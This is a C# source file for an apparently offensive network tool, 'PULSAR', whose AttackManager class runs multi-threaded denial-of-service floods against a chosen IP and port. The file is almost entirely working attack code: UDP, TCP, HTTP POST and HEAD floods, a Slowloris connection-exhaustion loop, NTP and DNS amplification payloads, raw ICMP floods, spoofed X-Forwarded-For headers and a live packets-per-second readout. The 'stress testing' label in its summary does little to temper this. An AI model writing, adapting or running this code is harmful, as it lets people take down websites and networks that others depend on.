// SPDX-License-Identifier: MIT
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using PULSAR.Core;
using PULSAR.UI;

namespace PULSAR.Attacks;

/// <summary>
/// Multi-vector network stress testing engine supporting UDP, TCP, HTTP, ICMP,
/// Slowloris, NTP amplification, DNS amplification, and combined multi-vector attacks.
/// </summary>
public class AttackManager
{
    private static readonly Random _random = new();

    /// <summary>
    /// Runs an enhanced multi-vector attack with full configuration options.
    /// </summary>
    /// <param name="method">Attack method (UDP, TCP, HTTP, ICMP, HTTP_HEAD, SLOWLORIS, NTP_AMP, DNS_AMP, MULTI).</param>
    /// <param name="ip">Target IP address.</param>
    /// <param name="port">Target port.</param>
    /// <param name="threads">Number of threads per vector.</param>
    /// <param name="duration">Attack duration in seconds.</param>
    /// <param name="packetSize">Packet size in bytes (0 = random/max).</param>
    /// <param name="randomPorts">If true, randomize target ports per packet.</param>
    /// <param name="useSpoofing">If true, spoof source IP in headers/payload.</param>
    /// <param name="token">Cancellation token.</param>
    public async Task RunEnhancedAttack(
        string method, string ip, int port, int threads, int duration,
        int packetSize, bool randomPorts, bool useSpoofing, CancellationToken token)
    {
        ModernUI.DrawLogo();
        ModernUI.ShowConnectionInfo(false);

        ModernUI.DrawBox("ENHANCED ATTACK CONFIGURATION", () =>
        {
            Console.WriteLine($"   Target:       {ModernUI.C_WHITE}{ip}:{port}{ModernUI.C_RESET}");
            Console.WriteLine($"   Method:       {ModernUI.C_YELLOW}{method}{ModernUI.C_RESET}");
            Console.WriteLine($"   Threads:      {ModernUI.C_CYAN}{threads}{ModernUI.C_RESET}");
            Console.WriteLine($"   Duration:     {ModernUI.C_CYAN}{duration}s{ModernUI.C_RESET}");
            Console.WriteLine($"   Packet Size:  {(packetSize == 0 ? "Random/Max" : packetSize + " bytes")}");
            Console.WriteLine($"   Random Ports: {(randomPorts ? "YES" : "NO")}");
            Console.WriteLine($"   IP Spoofing:  {(useSpoofing ? "SIMULATED (Header/Payload)" : "NO")}");
        });

        ModernUI.Print("Initializing attack vectors...", ModernUI.MsgType.Warning);
        Console.WriteLine();

        DateTime start = DateTime.Now;
        long totalPackets = 0;
        long totalBytes = 0;
        var cts = CancellationTokenSource.CreateLinkedTokenSource(token);

        var vectors = new List<string>();
        switch (method)
        {
            case "UDP": vectors.Add("UDP"); break;
            case "TCP": vectors.Add("TCP"); break;
            case "HTTP": vectors.Add("HTTP"); break;
            case "ICMP": vectors.Add("ICMP"); break;
            case "HTTP_HEAD": vectors.Add("HTTP_HEAD"); break;
            case "SLOWLORIS": vectors.Add("SLOWLORIS"); break;
            case "NTP_AMP": vectors.Add("NTP_AMP"); break;
            case "DNS_AMP": vectors.Add("DNS_AMP"); break;
            case "MULTI": vectors.AddRange(new[] { "UDP", "TCP", "HTTP", "ICMP" }); break;
            default: vectors.Add("UDP"); break;
        }

        int threadsPerVector = threads / vectors.Count;
        if (threadsPerVector < 1) threadsPerVector = 1;

        ModernUI.Print($"Launching {vectors.Count} attack vectors with {threadsPerVector} threads each...", ModernUI.MsgType.Wait);

        var allTasks = new List<Task>();

        foreach (var vector in vectors)
        {
            for (int i = 0; i < threadsPerVector; i++)
            {
                allTasks.Add(Task.Run(async () =>
                {
                    await RunAttackVector(vector, ip, port, packetSize, randomPorts, useSpoofing, start, duration, cts.Token,
                        (pkts, bytes) =>
                        {
                            Interlocked.Add(ref totalPackets, pkts);
                            Interlocked.Add(ref totalBytes, bytes);
                        });
                }));
            }
        }

        var statsTask = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested && (DateTime.Now - start).TotalSeconds < duration)
            {
                var elapsed = (DateTime.Now - start).TotalSeconds;
                var remaining = duration - elapsed;
                var pps = elapsed > 0 ? totalPackets / elapsed : 0;
                var mbps = elapsed > 0 ? (totalBytes * 8 / 1024 / 1024) / elapsed : 0;

                Console.Write($"\r   {ModernUI.C_RED}[ATTACK]{ModernUI.C_RESET} Time: {remaining:F0}s | Packets: {totalPackets:N0} | {pps:N0} pps | {mbps:F1} Mbps    ");
                await Task.Delay(100);
            }
        });

        try
        {
            await Task.WhenAll(allTasks);
        }
        catch (OperationCanceledException)
        {
            // Expected termination path
        }

        cts.Cancel();
        Console.WriteLine();
        Console.WriteLine();
        ModernUI.Print("Attack completed.", ModernUI.MsgType.Success);
        ModernUI.DrawBox("FINAL STATISTICS", () =>
        {
            var elapsed = (DateTime.Now - start).TotalSeconds;
            Console.WriteLine($"   Total Packets: {totalPackets:N0}");
            Console.WriteLine($"   Total Data:    {(totalBytes / 1024 / 1024):N0} MB");
            Console.WriteLine($"   Average PPS:   {(elapsed > 0 ? totalPackets / elapsed : 0):N0}");
            Console.WriteLine($"   Peak Load:     {(elapsed > 0 ? (totalBytes * 8 / 1024 / 1024) / elapsed : 0):F1} Mbps");
        });
    }

    /// <summary>
    /// Runs a single attack vector thread.
    /// </summary>
    private async Task RunAttackVector(string vector, string ip, int port, int packetSize, bool randomPorts, bool useSpoofing,
        DateTime start, int duration, CancellationToken token, Action<long, long> reportProgress)
    {
        long localPackets = 0;
        long localBytes = 0;
        byte[] buffer = new byte[packetSize == 0 ? 65507 : Math.Min(packetSize, 65507)];
        _random.NextBytes(buffer);

        try
        {
            switch (vector)
            {
                case "UDP":
                    using (var udp = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                    {
                        udp.SendBufferSize = 1048576;
                        var endpoint = new IPEndPoint(IPAddress.Parse(ip), port);
                        while (!token.IsCancellationRequested && (DateTime.Now - start).TotalSeconds < duration)
                        {
                            try
                            {
                                int currentPort = randomPorts ? _random.Next(1, 65535) : port;
                                var target = new IPEndPoint(IPAddress.Parse(ip), currentPort);
                                int size = packetSize == 0 ? _random.Next(1024, 65507) : packetSize;
                                udp.SendTo(buffer, 0, size, SocketFlags.None, target);
                                localPackets++;
                                localBytes += size;
                                if (localPackets % 100 == 0)
                                {
                                    reportProgress(100, localBytes);
                                    localBytes = 0;
                                }
                            }
                            catch { await Task.Delay(1); }
                        }
                    }
                    break;

                case "TCP":
                    while (!token.IsCancellationRequested && (DateTime.Now - start).TotalSeconds < duration)
                    {
                        try
                        {
                            using var tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            tcp.NoDelay = true;
                            tcp.SendBufferSize = 1048576;
                            tcp.ReceiveTimeout = 100;
                            tcp.SendTimeout = 100;

                            int currentPort = randomPorts ? _random.Next(1, 65535) : port;
                            await tcp.ConnectAsync(IPAddress.Parse(ip), currentPort);

                            int size = packetSize == 0 ? _random.Next(1024, 65535) : packetSize;
                            await tcp.SendAsync(new ArraySegment<byte>(buffer, 0, size), SocketFlags.None);
                            localPackets++;
                            localBytes += size;

                            tcp.LingerState = new LingerOption(true, 0);
                            tcp.Close();

                            if (localPackets % 50 == 0)
                            {
                                reportProgress(50, localBytes);
                                localBytes = 0;
                            }
                        }
                        catch { await Task.Delay(1); }
                    }
                    break;

                case "HTTP":
                    while (!token.IsCancellationRequested && (DateTime.Now - start).TotalSeconds < duration)
                    {
                        try
                        {
                            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(2) };
                            var url = $"http://{ip}:{port}/";
                            var content = new StringContent(new string('A', packetSize == 0 ? 1024 : Math.Min(packetSize, 100000)));

                            client.DefaultRequestHeaders.Add("X-Forwarded-For", $"{_random.Next(1, 255)}.{_random.Next(1, 255)}.{_random.Next(1, 255)}.{_random.Next(1, 255)}");
                            client.DefaultRequestHeaders.Add("User-Agent", $"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{_random.Next(500, 600)}.{_random.Next(1, 99)}");

                            var response = await client.PostAsync(url, content, token);
                            localPackets++;
                            localBytes += content.Headers.ContentLength ?? 1024;

                            if (localPackets % 10 == 0)
                            {
                                reportProgress(10, localBytes);
                                localBytes = 0;
                            }
                        }
                        catch { await Task.Delay(5); }
                    }
                    break;

                case "HTTP_HEAD":
                    while (!token.IsCancellationRequested && (DateTime.Now - start).TotalSeconds < duration)
                    {
                        try
                        {
                            using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(2) };
                            var request = new HttpRequestMessage(HttpMethod.Head, $"http://{ip}:{port}/");
                            request.Headers.Add("User-Agent", $"PULSAR/{Constants.VersionStr}");
                            await client.SendAsync(request, token);
                            localPackets++;
                            localBytes += 200;
                            if (localPackets % 20 == 0) { reportProgress(20, localBytes); localBytes = 0; }
                        }
                        catch { await Task.Delay(10); }
                    }
                    break;

                case "SLOWLORIS":
                    while (!token.IsCancellationRequested && (DateTime.Now - start).TotalSeconds < duration)
                    {
                        try
                        {
                            using var s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            await s.ConnectAsync(IPAddress.Parse(ip), port);
                            string startHeader = $"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Length: 42\r\n";
                            byte[] hBytes = Encoding.UTF8.GetBytes(startHeader);
                            await s.SendAsync(new ArraySegment<byte>(hBytes), SocketFlags.None);

                            while (!token.IsCancellationRequested && s.Connected)
                            {
                                byte[] keepAlive = Encoding.UTF8.GetBytes($"X-a: {_random.Next(1, 9999)}\r\n");
                                await s.SendAsync(new ArraySegment<byte>(keepAlive), SocketFlags.None);
                                localPackets++;
                                localBytes += keepAlive.Length;
                                reportProgress(1, keepAlive.Length);
                                await Task.Delay(1000);
                            }
                        }
                        catch { await Task.Delay(500); }
                    }
                    break;

                case "NTP_AMP":
                    byte[] ntpPayload = new byte[48];
                    ntpPayload[0] = 0x17; ntpPayload[1] = 0x00; ntpPayload[2] = 0x03; ntpPayload[3] = 0x2a;

                    using (var udp = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                    {
                        var target = new IPEndPoint(IPAddress.Parse(ip), 123);
                        while (!token.IsCancellationRequested && (DateTime.Now - start).TotalSeconds < duration)
                        {
                            try
                            {
                                udp.SendTo(ntpPayload, target);
                                localPackets++; localBytes += 48;
                                if (localPackets % 50 == 0) { reportProgress(50, localBytes); localBytes = 0; }
                            }
                            catch { await Task.Delay(1); }
                        }
                    }
                    break;

                case "DNS_AMP":
                    byte[] dnsPayload = new byte[] {
                        0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00,
                        0x00, 0xff,
                        0x00, 0x01
                    };
                    using (var udp = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                    {
                        var target = new IPEndPoint(IPAddress.Parse(ip), 53);
                        while (!token.IsCancellationRequested && (DateTime.Now - start).TotalSeconds < duration)
                        {
                            try
                            {
                                udp.SendTo(dnsPayload, target);
                                localPackets++; localBytes += dnsPayload.Length;
                                if (localPackets % 50 == 0) { reportProgress(50, localBytes); localBytes = 0; }
                            }
                            catch { await Task.Delay(1); }
                        }
                    }
                    break;

                case "ICMP":
                    using (var icmp = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp))
                    {
                        icmp.SendBufferSize = 1048576;
                        byte[] icmpPacket = new byte[packetSize == 0 ? 65500 : Math.Min(packetSize, 65500)];
                        icmpPacket[0] = 8;
                        icmpPacket[1] = 0;
                        byte[] randomData = new byte[icmpPacket.Length - 4];
                        _random.NextBytes(randomData);
                        Buffer.BlockCopy(randomData, 0, icmpPacket, 4, randomData.Length);

                        var endpoint = new IPEndPoint(IPAddress.Parse(ip), 0);
                        while (!token.IsCancellationRequested && (DateTime.Now - start).TotalSeconds < duration)
                        {
                            try
                            {
                                icmp.SendTo(icmpPacket, endpoint);
                                localPackets++;
                                localBytes += icmpPacket.Length;
                                if (localPackets % 100 == 0)
                                {
                                    reportProgress(100, localBytes);
                                    localBytes = 0;
                                }
                            }
                            catch { await Task.Delay(1); }
                        }
                    }
                    break;
            }
        }
        catch (OperationCanceledException)
        {
            // Expected termination path
        }

        if (localPackets > 0) reportProgress(localPackets, localBytes);
    }

    /// <summary>
    /// Simplified attack method that forwards to the enhanced version with default options.
    /// </summary>
    public async Task RunAttack(string method, string ip, int port, int threads, int duration, CancellationToken token)
    {
        await RunEnhancedAttack(method, ip, port, threads, duration, 0, false, false, token);
    }
}